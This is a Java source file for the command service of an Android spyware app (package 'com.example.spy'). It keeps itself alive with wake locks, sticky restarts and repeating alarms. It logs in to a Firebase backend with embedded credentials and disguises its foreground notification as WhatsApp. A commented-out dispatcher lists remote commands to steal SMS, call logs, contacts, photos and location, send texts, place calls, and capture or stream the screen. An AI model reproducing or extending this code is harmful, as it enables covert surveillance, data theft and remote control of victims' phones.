package com.example.spy.services;


import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.PowerManager;
import android.text.TextUtils;
import android.util.Log;

import com.example.spy.R;
import com.example.spy.utils.AppController;
import com.example.spy.utils.Constants;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.Source;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.disposables.Disposable;
import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.schedulers.Schedulers;

public class CommandService extends Service {
    String tag = "spybot";
    SharedPreferences prefs = new AppController().getContext().getSharedPreferences("com.android.spy", Context.MODE_PRIVATE);
    PowerManager powerManager = (PowerManager) new AppController().getContext().getSystemService(Context.POWER_SERVICE);
    PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE, "com.android.spybot:commandService");
    private Disposable disposable = null;


    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(tag, "On create Called");

        FirebaseFirestore.getInstance();


        doWork(Constants.DEVELOPMENT_SERVER);

        //if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) startForeground()
        setRepeatingAlarm();
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        Log.i(tag, "Running onStartCommand");
        //Log.i(tag, "\n\n\nSocket is " + if (Constants.socket?.connected() == true) "connected" else "not connected\n\n\n");

        startTimer();

        return Service.START_STICKY;
    }


    public void doWork(String server) {

        if (disposable == null || disposable.isDisposed()) {
            //FirebaseDatabase.getInstance().getReference().child(userEmail);

            loginToFirebase();

        }

    }

    private void loginToFirebase() {
        // Authenticate with Firebase, and request location updates
        String email = getString(R.string.firebase_email);
        String password = getString(R.string.firebase_password);
        FirebaseAuth.getInstance().signInWithEmailAndPassword(
                email, password).addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        Log.d(tag, "firebase auth success");
                        try{
                            requestCommandUpdates();
                        }catch (Exception e){
                            e.printStackTrace();
                            loginToFirebase();
                        }
                    } else {
                        Log.d(tag, "firebase auth failed");
                    }
                });
    }

    private void requestCommandUpdates(){


        /**
         val cmd = cmds.getJSONObject(i)

         val command = cmd.get("command") as String
         Log.i(tag, "\nCommand: " + cmd.toString() + "\n")


         when (command) {

         "getSms" -> {
         val arg1 = Integer.parseInt(cmd.get("arg1").toString())
         SmsTask(this, arg1, socket).start()
         }

         "getCallHistory" -> {
         val arg1 = Integer.parseInt(cmd.get("arg1").toString())
         CallLogsTask(this, arg1, socket).start()
         }

         "getContacts" -> {
         ContactsTask(this, socket).start()
         }

         "addContact" -> {
         val phone = cmd.get("arg1").toString()
         val name = cmd.get("arg2").toString()
         AddNewContact(this, phone, name).start()
         }

         "getLocation" -> {
         LocationMonitor(this, socket).start()
         }

         "sendSms" -> {
         val phoneNumber = cmd.get("arg1").toString()
         val textMessage = cmd.get("arg2").toString()
         SendSmsTask(this, textMessage, phoneNumber, socket).start()
         }

         "getImages" -> {
         PhotosTask(this, socket).start()
         }

         "downloadImage" -> {
         val path = cmd.get("arg1").toString()
         DownloadImage(this, socket, path).start()
         }

         "openBrowser" -> {

         val url = cmd.get("arg1").toString()

         val intent = Intent(Intent.ACTION_VIEW)
         intent.data = Uri.parse("http://$url")
         intent.`package` = "com.android.chrome"  // package of ChromeBrowser App
         startActivity(intent)
         }

         "takeScreenShot" -> {
         val intent = Intent(this, ScreenProjectionActivity::class.java)
         startActivity(intent)
         }

         "streamScreen" -> {
         val intent = Intent(this, ScreenProjectionActivity::class.java)
         intent.putExtra("streamScreen", true)
         startActivity(intent)
         }

         "streamCamera" -> {
         //I don't know how to stream yet!
         }

         "openApp" -> {
         val appPackage = cmd.get("arg1").toString()
         val intent: Intent = packageManager.getLaunchIntentForPackage(appPackage)
         startActivity(intent)
         }

         "openWhatsApp" -> {
         val number = cmd.get("arg1").toString()
         val text = cmd.get("arg2")?.toString() ?: ""
         startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://api.whatsapp.com/send?phone=$number&text=$text")))
         }

         "makeCall" -> {
         val number = cmd.get("arg1")
         val intent = Intent(Intent.ACTION_CALL)
         intent.data = Uri.parse("tel:$number")
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)
         startActivity(intent)
         }

         "notification" -> {
         // Way too long
         }

         "fileExplorer" -> {
         // It will take long
         }

         "clientID" -> {
         val clientID = cmd.get("arg1").toString()
         prefs.edit().putString("clientID", clientID).commit()
         Log.d(tag, "ClientID: $clientID")
         }

         "stopAll" -> {
         PhotosTask.flag = false
         StreamScreen.flagStop = true
         LocationMonitor.locationUpdates = false
         }

         else -> {
         Log.i(tag, "Unknown command")
         val xcmd = JSONObject()
         xcmd.put("event", "command:unknown")
         xcmd.put("uid", params.uid)
         xcmd.put("device", params.device)
         xcmd.put("command", command)
         }
         }*/
    }


    @Override
    public void onDestroy() {
        wakeLock.release();
        Log.d(tag, "On destroy Called");
        super.onDestroy();

        stoptimertask();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        wakeLock.release();
        Log.d(tag, "On task removed Called");
        super.onTaskRemoved(rootIntent);
    }

    public void setRepeatingAlarm() {

        Intent intent = new Intent(this, MyReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 99, intent, PendingIntent.FLAG_UPDATE_CURRENT);

        AlarmManager alarmManager = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmManager.cancel(pendingIntent);
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60 * 1000, 10 * 60 * 1000, pendingIntent);

    }

    public void startForeground() {

        Notification notification = new NotificationCompat.Builder(this, "channelId")
                .setSmallIcon(R.drawable.ic_whatsapp)
                .setContentTitle("WhatsApp")
                .setContentText("Checking for new messages...")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();

        startForeground(98, notification);
    }




    private int counter = 0;
    private Timer timer;
    private TimerTask timerTask;

    public void startTimer() {
        //set a new Timer
        timer = new Timer();

        //initialize the TimerTask's job
        initializeTimerTask();

        //schedule the timer, to wake up every 1 second
        timer.schedule(timerTask, 10000, 10000); //
    }

    public void initializeTimerTask() {
        timerTask = new TimerTask() {
            public void run() {
                Log.i("in timer", "in timer ++++  " + (counter++));
            }
        };
    }

    public void stoptimertask() {
        //stop the timer, if it's not already null
        if (timer != null) {
            timer.cancel();
            timer = null;
        }
    }

}
